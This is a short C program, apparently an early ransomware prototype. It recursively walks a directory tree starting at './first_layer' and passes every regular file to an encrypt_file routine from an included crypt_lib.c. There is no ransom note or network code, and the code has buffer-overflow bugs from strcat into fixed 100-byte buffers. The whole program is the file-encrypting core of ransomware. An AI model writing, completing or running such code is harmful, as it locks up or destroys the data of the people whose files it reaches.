#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include "crypt_lib.c"

#define EXPECTED_PATH "./first_layer"

void copy_string(char *target, char *source);
int search_directory_tree(char *path);

void copy_string(char *target, char *source) {
	while (*source) {
		*target = *source;
		source++;
		target++;
	}
	*target = '\0'; // Once at the end of the source string create a termination character for our new string location
}

int search_directory_tree(char *path) {
	struct dirent *dir_entry;
	DIR *dr = opendir(path);
	char current_path[3] = "/";
	int count = 0;
	unsigned char key = 4;

	strcat(path, current_path);

	if (dr == NULL) {
		printf("Couldnt open directory: %s\n", path);
		return 0;
	}

	while ((dir_entry = readdir(dr)) != NULL) {
		if (!(strcmp((char *)dir_entry->d_name, ".") == 0 || strcmp((char *)dir_entry->d_name, "..") == 0)) {
			printf("Made it with: %s\n", dir_entry->d_name);
			if (dir_entry->d_type == key) {
				char dest[100];
				int test, count = 0;
				copy_string(dest, path);
				strcat(dest, dir_entry->d_name);
				printf("%s\n", dest);
				search_directory_tree(dest);
				count++;
			} else if (dir_entry->d_type == 8) {
				char dest[100];
				strcpy(dest, path);
				strcat(dest, dir_entry->d_name);
				encrypt_file(dest);
			}
		}
	}
	if (count == 0) return 1;
	
	closedir(dr);
	return 0;
}

int main() {
	char path[256];
	const char *test_path = "/";
	getcwd(path, sizeof(path));


	if (strcmp(EXPECTED_PATH, path) == 0) {
		search_directory_tree(path);
	} else {
		chdir(EXPECTED_PATH);
		getcwd(path, sizeof(path));
	}

	search_directory_tree(path);

	return 0;
}
